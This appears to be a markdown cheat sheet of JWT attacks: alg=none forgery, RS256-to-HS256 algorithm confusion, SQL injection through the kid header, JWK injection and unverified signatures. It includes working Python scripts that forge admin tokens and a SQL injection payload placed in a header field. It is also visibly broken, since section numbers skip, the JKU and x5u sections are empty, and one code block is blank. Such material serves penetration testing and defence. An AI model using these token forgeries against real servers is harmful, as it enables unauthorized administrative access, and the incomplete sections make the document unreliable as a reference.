# 1️⃣ None Algorithm Attack

If server accepts:

```
"alg": "none"
```

Signature verification is skipped.

---

### Attack Flow

```mermaid
sequenceDiagram
    participant A as Attacker
    participant S as Server

    A->>S: Send JWT with alg=none
    Note over A: Remove signature
    A->>S: role=admin
    S->>S: Does not verify signature
    S-->>A: Admin access granted
```

---

### Exploit Script

```python
import base64
import json

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin"}

encoded_header = b64url_encode(json.dumps(header).encode())
encoded_payload = b64url_encode(json.dumps(payload).encode())

token = f"{encoded_header}.{encoded_payload}."
print(token)
```

# 3️⃣ Algorithm Confusion (RS256 → HS256)

Server expects RS256 but doesn’t enforce algorithm.

You sign token with:

- HS256
- Use server’s public key as HMAC secret

---

### Attack Flow

```mermaid
sequenceDiagram
    participant A as Attacker
    participant S as Server

    A->>S: JWT alg=HS256
    A->>S: Sign with server public key
    S->>S: Verifies using public key as secret
    S-->>A: Admin access
```

---

### Exploit

```python
import jwt

public_key = open("public.pem").read()

payload = {"sub": "admin", "role": "admin"}

token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
```

# 4️⃣ kid Header SQL Injection

Server does:

```sql
SELECT key FROM keys WHERE id = '{kid}'
```

Inject SQL.

---

### Malicious Header

```json
{
  "alg": "HS256",
  "kid": "' UNION SELECT 'secret' --"
}
```

---

### Python Generator

```python
import jwt

payload = {"sub": "admin", "role": "admin"}

token = jwt.encode(
    payload,
    "secret",
    algorithm="HS256",
    headers={"kid": "' UNION SELECT 'secret' --"}
)

print(token)
```

# 6️⃣ JKU Injection

Header contains:


# 7️⃣ JWK Injection

Direct key injection inside header:

```json
{
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "n": "attacker_generated_modulus"
  }
}
```

Server uses attacker-provided key.

# 8️⃣ x5u Injection

# 9️⃣ Signature Not Verified

Some apps decode token but don’t verify signature.

```python

```

Then trust payload.

Exploit: Modify payload only.
